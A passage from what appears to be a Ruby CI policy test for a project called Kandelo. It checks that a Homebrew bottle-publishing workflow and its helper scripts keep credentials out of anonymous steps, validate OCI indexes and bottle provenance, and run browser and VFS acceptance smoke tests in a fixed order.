          "bottle receipt runtime dependencies do not match validated dependency provenance"
        ) &&
        build_handoff_validator.index(inspector_call) < build_handoff_validator.index(output_start),
        "publisher handoff validation does not inspect bottle archives before producing uploader data")
  dependency_provenance = File.read(
    File.join(REPO_ROOT, "scripts/homebrew-dependency-provenance.py")
  )
  [
    "contexts = resolved_tap_contexts(args)",
    "context = contexts.get(dependency_tap)",
    "if context is None:",
    'f"target receipt runtime dependency {full_name!r} is outside immutable resolved taps"',
    'source.get("tap_git_head") != context["tap_commit"]',
    'formula_path = pathlib.Path(context["root"]) / "Formula" / f"{name}.rb"',
    'dependency_root_url = context["bottle_root_url"]',
  ].each do |fragment|
    check(dependency_provenance.include?(fragment),
          "publisher dependency provenance allows external target receipts: #{fragment}")
  end
  [
    'if "bottle_rebuild" not in dependency:',
    'return None',
    'rebuild = dependency["bottle_rebuild"]',
    'or isinstance(rebuild, bool)',
    '"a non-negative integer when present"',
    'receipt_bottle_rebuild = target_receipt_bottle_rebuild(dependency, full_name)',
    'if receipt_bottle_rebuild is not None and rebuild != receipt_bottle_rebuild:',
  ].each do |fragment|
    check(dependency_provenance.include?(fragment),
          "publisher dependency provenance weakens receipt rebuild validation: #{fragment}")
  end
  [
    '":any": "any"',
    '":any_skip_relocation": "any_skip_relocation"',
    'cellar = BREW_INFO_SYMBOLIC_CELLARS.get(cellar, cellar)',
    'if cellar not in BOTTLE_CELLARS:',
    'bottle_cellar = normalized_brew_info_cellar(tag.get("cellar"), full_name)',
  ].each do |fragment|
    check(dependency_provenance.include?(fragment),
          "publisher dependency provenance weakens brew info cellar normalization: #{fragment}")
  end
  [
    'def public_manifest_url(',
    'reference = f"{version}-{rebuild}" if rebuild else version',
    'return f"{bottle_root_url}/{dependency}/manifests/{reference}"',
    'def line_fetches_reference(line: str, references: tuple[str, ...]) -> bool:',
    'return match is not None and match.group(1) in references',
    'fetch_references = (bottle_url, bottle_manifest_url)',
    'if line_fetches_reference(line, fetch_references):',
    'validate_fetch_evidence(',
    '(bottle["url"], bottle_manifest_url)',
  ].each do |fragment|
    check(dependency_provenance.include?(fragment),
          "publisher dependency provenance weakens exact manifest fetch evidence: #{fragment}")
  end
  [
    'def exact_git_head(root: pathlib.Path, label: str) -> str:',
    'def formulae_equivalent_excluding_bottle(',
    '"--equivalent-excluding-bottle",',
    'if not validation_tap_root:',
    'fail("planned tap root requires a current tap root")',
    'if exact_git_head(planned_root, "planned tap root") != args.tap_commit:',
    'if planned_root is not None and dependency_tap == normalized_tap:',
    'if sha256_file(planned_formula_path) != formula["sha256"]:',
    'Formula digest differs from the planned tap',
    'if current_formula_sha != formula["sha256"]:',
    'elif current_formula_sha != formula["sha256"]:',
    'Formula differs from the planned tap outside canonical bottle metadata',
    'validate_parser.add_argument("--planned-tap-root")',
  ].each do |fragment|
    check(dependency_provenance.include?(fragment),
          "publisher dependency drift validation lacks #{fragment}")
  end
  check(upload_steps.none? { |step| step["name"].to_s.downcase.include?("diagnostic") } &&
        upload_steps.count { |step| step["uses"] == UPLOAD_ACTION } == 1,
        "credentialed uploader publishes diagnostics")

  index_validate = named_step(
    index_steps, "Validate child layouts and public publication evidence without credentials"
  )
  index_import = named_step(
    index_steps, "Import the existing public Homebrew version index anonymously"
  )
  index_compose = named_step(
    index_steps, "Compose one complete Homebrew version index without credentials"
  )
  index_publish = named_step(
    index_steps, "Publish the complete Homebrew version index in isolated ORAS auth state"
  )
  index_validate_run = index_validate.fetch("run")
  [
    "credential-free index input validator received $secret_name",
    "scripts/homebrew-index-artifact-paths.sh",
    '--kind child', '--kind publication',
    "OCI child and public receipt counts differ",
    "missing or ambiguous public child publication receipt",
    "public child publication receipt was reused",
    "scripts/homebrew-oci-layout.py validate-child",
    "validate-publication-receipt", '--kind child',
    'printf \'%s\\0%s\\0\'',
  ].each do |fragment|
    check(index_validate_run.include?(fragment),
          "publisher version-index input validation lacks #{fragment}")
  end
  child_validation_index = index_validate_run.index(
    "scripts/homebrew-oci-layout.py validate-child"
  )
  child_arch_index = index_validate_run.index('arch="$(jq -er \'.arch\' "$receipt")"')
  check(child_validation_index && child_arch_index && child_validation_index < child_arch_index,
        "publisher trusts a child receipt architecture before validating its OCI layout")
  topology_helper = File.read(
    File.join(REPO_ROOT, "scripts/homebrew-index-artifact-paths.sh")
  )
  [
    'if [ -e "$ROOT/receipt.json" ] || [ -L "$ROOT/receipt.json" ]',
    'fail "flattened receipt is not a regular file"',
    'fail "nested artifact directory has an unexpected name"',
    'fail "nested receipt is not a regular file"',
    'fail "nested artifact download must contain multiple artifacts"',
    'fail "artifact download has an invalid receipt count"',
  ].each do |fragment|
    check(topology_helper.include?(fragment),
          "publisher index artifact topology helper lacks #{fragment}")
  end
  index_import_run = index_import.fetch("run")
  check(index_import.keys.sort == %w[env id name run shell] &&
        index_import["id"] == "existing-index" && index_import["shell"] == "bash" &&
        index_import["env"] == {
          "KANDELO_HOMEBREW_FORMULA" => "${{ matrix.formula }}",
          "KANDELO_HOMEBREW_TAP_REPOSITORY" => "${{ inputs.tap-repository }}",
          "KANDELO_HOMEBREW_TAP_NAME" => "${{ inputs.tap-name }}",
        }, "publisher anonymous version-index import mapping changed")
  repository_remote =
    'remote="ghcr.io/${tap_repository}/${KANDELO_HOMEBREW_FORMULA}"'
  [
    "anonymous index import received $secret_name",
    "scripts/homebrew-oci-layout.py import-public-index",
    'tap_repository="$(printf \'%s\' "$KANDELO_HOMEBREW_TAP_REPOSITORY" | tr \'[:upper:]\' \'[:lower:]\')"',
    repository_remote,
    '--remote "$remote"', '--reference "$top_ref"',
    '--registry-config "$anonymous_config"', '--out-layout "$existing"',
    '--out-result "$result"',
    'keys == ["digest", "layout", "schema", "status"]',
    'keys == ["schema", "status"]',
  ].each do |fragment|
    check(index_import_run.include?(fragment),
          "publisher anonymous version-index import lacks #{fragment}")
  end
  check(index_import_run.scan(repository_remote).length == 1 &&
        !index_import_run.include?('remote="ghcr.io/${tap_name}/'),
        "publisher anonymous version-index import is not repository-rooted")
  check((credential_names & index_import_run.scan(/[A-Z][A-Z0-9_]+/)).all? do |name|
    index_import_run.include?("-u #{name}") || index_import_run.include?("$secret_name")
  end, "publisher anonymous version-index import references an available credential")
  index_import_tool = File.read(File.join(REPO_ROOT, "scripts/homebrew-oci-layout.py"))
  [
    'commands.add_parser("import-public-index")',
    'target=f"{remote}:{reference}"',
    'descriptor=True',
    'target=f"{remote}@sha256:{digest}"',
    'MAX_BOTTLE_BYTES',
    'run_bounded_command(',
    '"oras", "blob", "fetch", "--descriptor"',
    'resolve_remote_blob_descriptor(',
    'f"{remote}@sha256:{top_digest}"',
    '"--to-oci-layout"',
    'def run_oras_blob_fetch(',
    'blob=True',
    'load_homebrew_index_root(output_layout, expected_root)',
    'output_layout / "index.json"',
    '"manifests": [expected_root]',
    'untagged Homebrew child set',
  ].each do |fragment|
    check(index_import_tool.include?(fragment),
          "trusted anonymous version-index importer lacks #{fragment}")
  end
  publication_limits = File.read(
    File.join(REPO_ROOT, "scripts/homebrew-publication-limits.sh")
  )
  bottle_inspector = File.read(
    File.join(REPO_ROOT, "scripts/homebrew-inspect-bottle.py")
  )
  check(publication_limits.include?("readonly HOMEBREW_MAX_BOTTLE_BYTES=2147483648") &&
        publication_limits.include?(
          "readonly HOMEBREW_MAX_EXPANDED_BOTTLE_BYTES=17179869184"
        ) &&
        index_import_tool.include?('MAX_EXPANDED_BOTTLE_BYTES') &&
        index_import_tool.include?('publication_limits()') &&
        bottle_inspector.include?('publication_archive_limits()') &&
        bottle_inspector.include?('"$HOMEBREW_MAX_BOTTLE_BYTES"') &&
        bottle_inspector.include?('"$HOMEBREW_MAX_EXPANDED_BOTTLE_BYTES"') &&
        !bottle_inspector.include?('MAX_COMPRESSED_BYTES = 2 * 1024') &&
        !bottle_inspector.include?('MAX_ARCHIVE_BYTES = 16 * 1024'),
        "trusted OCI tooling does not use separate shared compressed and expanded limits")
  index_compose_run = index_compose.fetch("run")
  [
    "credential-free index composer received $secret_name",
    'args+=(--child-layout "$layout" --child-receipt "$receipt")',
    'args+=(--existing-layout "$existing")',
    "scripts/homebrew-oci-layout.py merge-index",
    '--out-layout "$RUNNER_TEMP/homebrew-complete-index/layout"',
    '--out-receipt "$RUNNER_TEMP/homebrew-complete-index/layout-receipt.json"',
  ].each do |fragment|
    check(index_compose_run.include?(fragment),
          "publisher complete version-index composition lacks #{fragment}")
  end
  index_publish_run = index_publish.fetch("run")
  [
    "scripts/homebrew-ghcr-upload.sh",
    '--layout "$RUNNER_TEMP/homebrew-complete-index/layout"',
    '--layout-receipt "$RUNNER_TEMP/homebrew-complete-index/layout-receipt.json"',
    "--auth-mode github-token",
    "--require-pat false",
    "--destination-mode repository",
    '--out-json "$RUNNER_TEMP/homebrew-complete-index/transport-receipt.json"',
  ].each do |fragment|
    check(index_publish_run.include?(fragment),
          "publisher isolated version-index transport lacks #{fragment}")
  end
  check(index_steps.index(index_validate) < index_steps.index(index_import) &&
        index_steps.index(index_import) < index_steps.index(index_compose) &&
        index_steps.index(index_compose) < index_steps.index(index_publish) &&
        index_steps.index(index_publish) < index_steps.index(index_publication_upload),
        "publisher version-index validation, aggregation, transport, or evidence order changed")
  check(index_steps.none? { |step| step["name"].to_s.downcase.include?("diagnostic") } &&
        index_steps.count { |step| step["uses"] == UPLOAD_ACTION } == 1,
        "credentialed version-index publisher publishes diagnostics")

  privileged_runs = [upload_steps, index_steps].flatten.filter_map { |step| step["run"] }.join("\n")
  %w[
    homebrew-bottle-build.sh homebrew-formula-source-digest.rb
    homebrew-validate-formula-source-closure.sh
  ].each do |forbidden|
    check(!privileged_runs.include?(forbidden),
          "packages:write phase can execute Formula-controlled source through #{forbidden}")
  end
  check(!privileged_runs.match?(/(?:^|[[:space:]])ruby(?:[[:space:]]|$)/),
        "packages:write phase executes Ruby")

  canonical_build = named_step(verify_steps,
                               "Validate build handoff and reconstruct canonical bottle JSON").fetch("run")
  canonical_receipt = named_step(verify_steps,
                                 "Validate receipt against exact bottle bytes").fetch("run")
  [canonical_build, canonical_receipt].each do |run|
    check(run.include?('--tap-repository "$KANDELO_HOMEBREW_TAP_REPOSITORY"') &&
          run.include?('--tap-name "$KANDELO_HOMEBREW_TAP_NAME"') &&
          run.include?('--out-bottle-json "$RUNNER_TEMP/homebrew-verified-input/bottle.json"'),
          "publisher does not reconstruct canonical bottle JSON")
  end
  check_forbidden_root_args(canonical_build,
                            "publisher verifier handoff validation", trusted_runner_roots)
  check_forbidden_root_args(canonical_receipt,
                            "publisher verifier receipt validation", trusted_runner_roots)
  check(canonical_build.include?('--tap-root "$GITHUB_WORKSPACE/tap"'),
        "publisher does not bind dependency provenance to the exact tap")
  merge_run = named_step(verify_steps,
                         "Compose only reconstructed bottle metadata into the fresh tap").fetch("run")
  [
    "scripts/homebrew-merge-bottle-json.sh", '--bottle-json "$BOTTLE_JSON"',
    '--tap-repository "$TAP_REPOSITORY"', '--tap-name "$TAP_NAME"',
    '--release-tag "$RELEASE_TAG"',
    '--expected-sha256 "$BOTTLE_SHA256"', '--expected-root-url "$BOTTLE_ROOT_URL"',
    'merged_tap="$RUNNER_TEMP/homebrew-merged-tap"',
    'cp -a "$GITHUB_WORKSPACE/tap" "$merged_tap"',
    '[ "$changed" = "Formula/$FORMULA.rb" ]',
    'bottle merge modified the archived source tap',
  ].each do |fragment|
    check(merge_run.include?(fragment), "publisher canonical bottle merge lacks #{fragment}")
  end

  anonymous_run = named_step(verify_steps,
                             "Select exact anonymous bottle bytes for runtime validation").fetch("run")
  [
    "scripts/homebrew-verify-public-bottle.ts", '--url "$BOTTLE_URL"',
    '--sha256 "$BOTTLE_SHA256"', '--bytes "$BOTTLE_BYTES"', '--out "$runtime_bottle"',
    'runtime_bottle="$bottle_cache/$BOTTLE_FILENAME"',
    'actual_sha="$(sha256sum "$runtime_bottle"',
  ].each do |fragment|
    check(anonymous_run.include?(fragment), "publisher anonymous bottle readback lacks #{fragment}")
  end
  check(!anonymous_run.include?('basename "$BOTTLE_ARCHIVE"'),
        "publisher renames a selected bottle without validated Homebrew metadata")
  check((credential_names & anonymous_run.scan(/[A-Z][A-Z0-9_]+/)).empty?,
        "publisher anonymous bottle readback references a credential")
  index_verify = named_step(
    verify_steps, "Validate exact public Homebrew index traversal without credentials"
  )
  check(index_verify.keys.sort == %w[env if name run shell] &&
        index_verify["if"] ==
          "${{ !inputs.dry-run && steps.index-publication.outcome == 'success' }}" &&
        index_verify["shell"] == "bash" && index_verify["env"] == {
          "KANDELO_HOMEBREW_ARCH" => "${{ matrix.arch }}",
          "KANDELO_HOMEBREW_FORMULA" => "${{ matrix.formula }}",
          "KANDELO_HOMEBREW_TAP_REPOSITORY" => "${{ inputs.tap-repository }}",
          "KANDELO_HOMEBREW_TAP_NAME" => "${{ inputs.tap-name }}",
        }, "publisher exact public Homebrew index verification mapping changed")
  index_verify_run = index_verify.fetch("run")
  [
    "public Homebrew index verifier received $secret_name",
    "validate-index-receipt", "validate-publication-receipt", "--kind index",
    "oras cp", "--from-registry-config", "--to-oci-layout",
    "scripts/homebrew-oci-layout.py validate-index",
    'tap_repository="$(printf \'%s\' "$KANDELO_HOMEBREW_TAP_REPOSITORY" | tr \'[:upper:]\' \'[:lower:]\')"',
    repository_remote,
    '.manifest_digest == $child[0].oci.manifest.digest',
    '.bottle_sha256 == $child[0].bottle.sha256',
  ].each do |fragment|
    check(index_verify_run.include?(fragment),
          "publisher exact public Homebrew index verification lacks #{fragment}")
  end
  check(index_verify_run.scan(repository_remote).length == 1 &&
        !index_verify_run.include?('remote="ghcr.io/${tap_name}/'),
        "publisher public Homebrew index verification is not repository-rooted")
  browser_sysroot_step = named_step(
    verify_steps, "Build Kandelo wasm64 sysroot for the interactive browser graph"
  )
  check(browser_sysroot_step.keys.sort == %w[if name run shell] &&
        browser_sysroot_step["shell"] == "bash" &&
        browser_sysroot_step["if"] ==
          "${{ matrix.formula == 'hello' && matrix.arch == 'wasm32' }}",
        "publisher interactive browser wasm64 sysroot is not scoped to hello/wasm32")
  browser_sysroot_run = browser_sysroot_step.fetch("run")
  [
    "set -euo pipefail", "cd kandelo-sysroot-build",
    "bash scripts/dev-shell.sh bash scripts/build-musl.sh --arch wasm64posix",
    "[ -f sysroot64/lib/libc.a ]",
  ].each do |fragment|
    check(browser_sysroot_run.include?(fragment),
          "publisher interactive browser wasm64 sysroot lacks #{fragment}")
  end
  check(!browser_sysroot_run.lines.any? { |line| line.strip == "cd kandelo" },
        "publisher builds the browser wasm64 sysroot in the reviewed verifier checkout")
  browser_demo_step = named_step(verify_steps,
                                 "Prepare the supported interactive browser demo graph")
  check(browser_demo_step.keys.sort == %w[if name run shell] &&
        browser_demo_step["shell"] == "bash" &&
        browser_demo_step["if"] == "${{ matrix.formula == 'hello' && matrix.arch == 'wasm32' }}",
        "publisher interactive browser graph is not scoped to hello/wasm32")
  browser_demo_run = browser_demo_step.fetch("run")
  [
    "for sysroot_name in sysroot sysroot64",
    'sysroot_source="$GITHUB_WORKSPACE/kandelo-sysroot-build/$sysroot_name"',
    'sysroot_destination="$GITHUB_WORKSPACE/kandelo/$sysroot_name"',
    '[ -d "$sysroot_source" ] && [ ! -L "$sysroot_source" ]',
    '[ -f "$sysroot_source/lib/libc.a" ]',
    '[ ! -e "$sysroot_destination" ] && [ ! -L "$sysroot_destination" ]',
    'cp -a -- "$sysroot_source" "$sysroot_destination"',
    '[ -f "$sysroot_destination/lib/libc.a" ]',
    "bash scripts/dev-shell.sh ./run.sh --fetch-only prepare-browser",
  ].each do |fragment|
    check(browser_demo_run.include?(fragment),
          "publisher hello verification browser graph lacks #{fragment}")
  end
  check(!browser_demo_run.include?("scripts/fetch-binaries.sh"),
        "publisher hello verification bypasses the supported browser package selection")
  verifier_runtime_step = named_step(verify_steps,
                                     "Materialize Formula verification platform runtime")
  check(verifier_runtime_step.keys.sort == %w[name run shell] &&
        verifier_runtime_step["shell"] == "bash",
        "publisher Formula verification runtime mapping changed")
  verifier_runtime_run = verifier_runtime_step.fetch("run")
  [
    "bash scripts/dev-shell.sh bash -c", 'host="$(rustc -vV | sed -n "s/^host: //p")"',
    "for package in dash coreutils grep sed rootfs",
    'cargo run --release -p xtask --target "$host" --quiet --',
    "build-deps --arch wasm32", '--binaries-dir "$PWD/binaries"',
    '--fetch-only resolve "$package"',
    'bash scripts/materialize-resolver-binaries.sh "$PWD/binaries"',
  ].each do |fragment|
    check(verifier_runtime_run.include?(fragment),
          "publisher Formula verification runtime lacks #{fragment}")
  end
  sidecar_run = named_step(verify_steps,
                           "Generate sidecars from the selected bottle").fetch("run")
  check(sidecar_run.include?('KANDELO_HOMEBREW_BOTTLE_ARCHIVE="$RUNTIME_BOTTLE"') &&
        sidecar_run.include?('KANDELO_HOMEBREW_TAP_ROOT="$RUNNER_TEMP/homebrew-merged-tap-postverify"') &&
        sidecar_run.include?('KANDELO_HOMEBREW_FORMULA_SOURCE_ROOT="$GITHUB_WORKSPACE/tap-postverify"') &&
        sidecar_run.include?('KANDELO_HOMEBREW_BUILD_ROOT="$GITHUB_WORKSPACE/kandelo-sysroot-build"') &&
        sidecar_run.include?('KANDELO_HOMEBREW_BOTTLE_JSON="$RUNNER_TEMP/homebrew-verified-input/bottle.json"') &&
        sidecar_run.include?('KANDELO_HOMEBREW_DEPENDENCY_PROVENANCE="$DEPENDENCY_PROVENANCE"') &&
        sidecar_run.include?("scripts/homebrew-generate-sidecars-from-env.sh"),
        "publisher sidecars do not use archived Formula facts and the anonymously selected bottle")
  forbidden_root_json_fragments = [
    'export KANDELO_HOMEBREW_FORBIDDEN_ROOTS_JSON="$(jq -cn \\',
    '--arg github_workspace "$GITHUB_WORKSPACE" \\',
    '--arg runner_workspace "$(dirname "$GITHUB_WORKSPACE")" \\',
    '--arg runner_temp "$RUNNER_TEMP" \\',
    '--arg build_home "/home/kandelo-homebrew-build" \\',
    "'[\u0024github_workspace, \u0024runner_workspace, \u0024runner_temp, \u0024build_home]')\"",
  ]
  forbidden_root_json_fragments.each do |fragment|
    check(sidecar_run.include?(fragment),
          "publisher sidecar inspection lacks trusted forbidden-root source #{fragment}")
  end
  sidecar_env_forwarding = [
    'bash scripts/dev-shell.sh env \\',
    resolved_taps_forwarding,
    'KANDELO_HOMEBREW_TAP_NAME="$KANDELO_HOMEBREW_TAP_NAME" \\',
    'KANDELO_HOMEBREW_FORBIDDEN_ROOTS_JSON="$KANDELO_HOMEBREW_FORBIDDEN_ROOTS_JSON" \\',
  ]
  sidecar_env_forwarding.each do |fragment|
    check(sidecar_run.include?(fragment),
          "publisher sidecar inspection drops explicit identity or root data at the dev-shell boundary")
  end
  verifier_source = File.read(File.join(REPO_ROOT, "scripts/homebrew-generate-sidecars-from-env.sh"))
  bottle_inspector_source = File.read(File.join(REPO_ROOT, "scripts/homebrew-inspect-bottle.py"))
  formula_digest_source = File.read(
    File.join(REPO_ROOT, "scripts/homebrew-formula-source-digest.rb")
  )
  bottle_inspector_test = File.read(
    File.join(REPO_ROOT, "scripts/test-homebrew-inspect-bottle.sh")
  )
  formula_digest_test = File.read(
    File.join(REPO_ROOT, "scripts/test-homebrew-oci-layout.sh")
  )
  fingerprint_source = File.read(File.join(REPO_ROOT, "scripts/homebrew-sysroot-fingerprint.sh"))
  merge_source = File.read(File.join(REPO_ROOT, "scripts/homebrew-merge-bottle-json.sh"))
  check_sidecar_sysroot_binding(verifier_source, fingerprint_source)
  check(verifier_source.include?('KANDELO_HOMEBREW_FORBIDDEN_ROOTS_JSON') &&
        verifier_source.include?('forbidden_roots = json.loads') &&
        verifier_source.include?('inspection_command.extend(("--forbidden-root", forbidden_root))'),
        "sidecar generator does not preserve trusted forbidden-root inspection")
  check(verifier_source.include?('"--selected-formula",') &&
        verifier_source.include?('os.environ["FORMULA_PATH"]') &&
        bottle_inspector_source.include?('"--receipt-equivalent"') &&
        bottle_inspector_source.include?('normalization not in {"exact", "bottle-block-removed"}') &&
        formula_digest_source.include?('def receipt_match_kind(selected, receipt)') &&
        formula_digest_source.include?(
          'return nil if selected.bottle_range.nil? || !receipt.bottle_range.nil?'
        ) &&
        formula_digest_source.include?('removal_end = selected.bottle_range.end') &&
        formula_digest_source.include?('lines[removal_end + 1] == "\\n"') &&
        formula_digest_source.include?(
          'lines.slice!(selected.bottle_range.begin..removal_end)'
        ) &&
        formula_digest_source.include?('lines.join == receipt.source'),
        "sidecar generator does not enforce one-way canonical Formula receipt normalization")
  [
    "SELECTED_WASM32_BOTTLE_FORMULA",
    "ARCHIVED_WASM64_RECEIPT_FORMULA",
    "non-bottle-receipt-drift",
    "replaced-bottle-receipt",
  ].each do |fragment|
    check(bottle_inspector_test.include?(fragment),
          "Formula receipt normalization regression coverage lacks #{fragment}")
  end
  [
    "mid-class-archived.rb",
    "mid-class-selected.rb",
    "mid-class-extra-blank.rb",
    "Formula receipt rejected Homebrew's canonical mid-class bottle-block removal",
    "Formula receipt ignored non-Homebrew whitespace after a mid-class bottle block",
  ].each do |fragment|
    check(formula_digest_test.include?(fragment),
          "Formula identity regression coverage lacks #{fragment}")
  end
  [verifier_source, merge_source].each do |source|
    check(!source.include?("HOMEBREW_BREW_FILE") &&
          !source.include?("brew info") &&
          !source.include?("bottle --merge") &&
          !source.include?("homebrew-patched-launcher"),
          "post-build verifier evaluates Formula Ruby through Homebrew")
  end
  browser_run = named_step(verify_steps,
                           "Build and strictly smoke the hello browser image").fetch("run")
  [
    "bash -c", "KANDELO_HOMEBREW_STRICT_PUBLISHER_SMOKE=1",
    'KANDELO_HOMEBREW_BUILD_ROOT="$GITHUB_WORKSPACE/kandelo-sysroot-build"',
    "--reporter=json", ".stats.expected == 1", ".stats.unexpected == 0",
    ".stats.flaky == 0", ".stats.skipped == 0",
  ].each do |fragment|
    check(browser_run.include?(fragment), "publisher strict browser smoke lacks #{fragment}")
  end
  forbidden_root_json_fragments.each do |fragment|
    check(browser_run.include?(fragment),
          "publisher browser sidecar regeneration lacks trusted forbidden-root source #{fragment}")
  end
  sidecar_env_forwarding.each do |fragment|
    check(browser_run.include?(fragment),
          "publisher browser sidecar regeneration drops explicit identity or root data at the dev-shell boundary")
  end

  acceptance_step = named_step(
    verify_steps, "Boot an exact dependency-bearing Brewfile image on Node and Chromium"
  )
  check(acceptance_step.keys.sort == %w[env name run shell] &&
        acceptance_step["shell"] == "bash" && acceptance_step["env"] == {
          "KANDELO_HOMEBREW_ACCEPTANCE_ARCH" => "${{ matrix.arch }}",
          "KANDELO_HOMEBREW_ACCEPTANCE_DRY_RUN" => "${{ inputs.dry-run }}",
          "KANDELO_HOMEBREW_ACCEPTANCE_FORMULA" => "${{ matrix.formula }}",
          "KANDELO_HOMEBREW_ACCEPTANCE_REQUIRED" => "${{ inputs.require-vfs-acceptance }}",
        }, "publisher dependency-bearing VFS acceptance mapping changed")
  acceptance_run = acceptance_step.fetch("run")
  [
    'tap_root="$(realpath "$GITHUB_WORKSPACE/tap-postverify")"',
    'policy_dir="$GITHUB_WORKSPACE/tap-postverify/Kandelo"',
    '[ -L "$policy_dir" ] || { [ -e "$policy_dir" ] && [ ! -d "$policy_dir" ]; }',
    'config_candidate="$policy_dir/vfs-acceptance.json"',
    'if [ ! -e "$config_candidate" ] && [ ! -L "$config_candidate" ]; then',
    'required dependency-bearing VFS acceptance selection disappeared after planning',
    'no closure acceptance evidence was produced',
    'tap VFS acceptance configuration must be a regular non-symlink file',
    'config="$(realpath "$config_candidate")"',
    'tap VFS acceptance configuration resolved outside the exact tap checkout',
    'keys == ["argv", "brewfile", "executable", "expected_stdout", "formula", "schema"]',
    'keys == ["argv", "brewfile", "executable", "expected_stdout", "formula", "schema", "shell_config"]',
    'contains("\u000a") == false', 'contains("\u000d") == false',
    'required dependency-bearing VFS acceptance cannot run in dry-run mode',
    'anonymous reads of published GHCR bottles',
    'cp -a "$GITHUB_WORKSPACE/tap-postverify" "$acceptance_tap"',
    'rsync -a "$RUNNER_TEMP/homebrew-sidecars/Formula/" "$acceptance_tap/Formula/"',
    'rsync -a "$RUNNER_TEMP/homebrew-sidecars/Kandelo/" "$acceptance_tap/Kandelo/"',
    'brewfile_candidate="$GITHUB_WORKSPACE/tap-postverify/$brewfile_rel"',
    '[ -f "$brewfile_candidate" ] && [ ! -L "$brewfile_candidate" ]',
    'brewfile="$(realpath "$brewfile_candidate")"',
    'shell_config_candidate="$GITHUB_WORKSPACE/tap-postverify/$shell_config_rel"',
    'tap default-shell config must be a regular non-symlink file',
    'default-shell config resolved outside the exact tap checkout',
    'default-shell config must contain 1 to 65536 bytes',
    'vfs_args+=(--write-profile --shell-config "$shell_config")',
    'node_args+=(--shell-config "$shell_config")',
    'resolver_paths="$acceptance_root/resolved-platform-artifacts.txt"',
    '[ ! -e "$resolver_paths" ] && [ ! -L "$resolver_paths" ]',
    "bash scripts/dev-shell.sh bash -c '",
    'bash scripts/resolve-binary.sh programs/rootfs.vfs >"$1"',
    'bash scripts/resolve-binary.sh kernel.wasm >>"$1"',
    '[ -f "$resolver_paths" ] && [ ! -L "$resolver_paths" ]',
    'resolver_paths_bytes="$(wc -c <"$resolver_paths" | tr -d \'[:space:]\')"',
    '[ "$resolver_paths_bytes" -gt 8192 ]',
    'mapfile -t resolved_platform_artifacts <"$resolver_paths"',
    '[ "${#resolved_platform_artifacts[@]}" -eq 2 ]',
    'base_image="${resolved_platform_artifacts[0]}"',
    'platform base did not resolve from the Kandelo package registry tree',
    'kernel="${resolved_platform_artifacts[1]}"',
    'verification kernel did not resolve from the exact worktree build',
    '--runtime node', '--no-fallback',
    'bash scripts/dev-shell.sh npx tsx',
    'scripts/homebrew-vfs-acceptance-smoke.ts',
    '--base-origin kandelo-package-registry', '--kernel-origin worktree-build',
    '--formula "$selected_formula"',
    '[ "$(jq -er \'.image.sha256\' "$node_evidence")" = "$image_sha256" ]',
    'export KANDELO_BROWSER_DEMO_INPUTS="homebrew-vfs-test"',
    'KANDELO_BROWSER_DEMO_INPUTS="$KANDELO_BROWSER_DEMO_INPUTS"',
    'bash ../../scripts/dev-shell.sh env',
    'test/homebrew-brewfile-vfs.spec.ts',
    'KANDELO_HOMEBREW_DEFAULT_SHELL_VFS_URL="$KANDELO_HOMEBREW_DEFAULT_SHELL_VFS_URL"',
    'KANDELO_HOMEBREW_DEFAULT_SHELL_PATH="$KANDELO_HOMEBREW_DEFAULT_SHELL_PATH"',
    'KANDELO_HOMEBREW_DEFAULT_SHELL_ARGV0="$KANDELO_HOMEBREW_DEFAULT_SHELL_ARGV0"',
    'test/kandelo-homebrew.spec.ts',
    'legacy_shell_downloads: 0',
    '.stats.expected == 1', '.stats.unexpected == 0',
    '.stats.flaky == 0', '.stats.skipped == 0',
  ].each do |fragment|
    check(acceptance_run.include?(fragment),
          "publisher dependency-bearing VFS acceptance lacks #{fragment}")
  end
  check(acceptance_run.match?(
          /if \[ ! -e "\$config_candidate" \] && \[ ! -L "\$config_candidate" \]; then\n\s+if \[ "\$KANDELO_HOMEBREW_ACCEPTANCE_REQUIRED" = "true" \]; then\n\s+echo "::error::[^\n]+"\n\s+exit 1\n\s+fi\n\s+echo "::notice::[^\n]+no closure acceptance evidence was produced"\n\s+exit 0/
        ), "publisher does not preserve optional and required VFS acceptance semantics")
  check((credential_names & acceptance_run.scan(/[A-Z][A-Z0-9_]+/)).empty?,
        "publisher dependency-bearing VFS acceptance references a credential")
  sidecar_generation = named_step(verify_steps, "Generate sidecars from the selected bottle")
  sidecar_validation = named_step(
    verify_steps, "Validate generated sidecars against the exact base tap"
  )
  check(verify_steps.index(sidecar_generation) < verify_steps.index(acceptance_step) &&
        verify_steps.index(acceptance_step) < verify_steps.index(sidecar_validation),
        "publisher dependency-bearing VFS acceptance runs outside the verified sidecar boundary")

  acceptance_source = File.read(
    File.join(REPO_ROOT, "scripts/homebrew-vfs-acceptance-smoke.ts")
  )
  [
    "allowFallback: false", "createBrowserCandidateMetadata", 'runtime: "node"',
    'runtime: "browser"', 'compatibility_basis: "pending-exact-image-runtime-test"',
    "selected acceptance formula must resolve at least one real package dependency edge",
    "did not select a current successful bottle", "bottle URL is not the repository GHCR blob",
    "is not a Brewfile root", "is not a link owned by acceptance formula",
    "base VFS ABI", "kernel Wasm ABI", "Node acceptance stdout did not contain",
    "expected stdout must be a single-line string",
    "does not match the reviewed shell config",
    "default shell", "must be linked by exactly one selected Homebrew bottle",
    '"--shell-config"',
  ].each do |fragment|
    check(acceptance_source.include?(fragment),
          "Homebrew VFS acceptance verifier lacks #{fragment}")
  end
  browser_acceptance_source = File.read(
    File.join(REPO_ROOT, "apps/browser-demos/pages/homebrew-vfs-test/main.ts")
  )
  check(browser_acceptance_source.include?('fetchBytes(request.vfsUrl, "Homebrew VFS image")') &&
        browser_acceptance_source.include?("vfsImage: new Uint8Array(imageBytes)") &&
        !browser_acceptance_source.include?("live-setup") &&
        !browser_acceptance_source.include?(".saveImage("),
        "browser Homebrew VFS acceptance does not boot the exact fetched image bytes")
  browser_acceptance_test = File.read(
    File.join(REPO_ROOT, "apps/browser-demos/test/homebrew-brewfile-vfs.spec.ts")
  )
  check(browser_acceptance_test.include?("expect(result.imageSha256).toBe(imageSha256)") &&
        browser_acceptance_test.include?("expect(result.kernelSha256).toBe(kernelSha256)") &&
        browser_acceptance_test.include?("expect(result.exitCode, result.stderr).toBe(0)"),
        "browser Homebrew VFS acceptance test does not bind exact artifacts and command success")
  default_shell_test = File.read(
    File.join(REPO_ROOT, "apps/browser-demos/test/kandelo-homebrew.spec.ts")
  )
  check(default_shell_test.include?("KANDELO_HOMEBREW_DEFAULT_SHELL_VFS_URL") &&
        default_shell_test.include?("KANDELO_HOMEBREW_DEFAULT_SHELL_PATH") &&
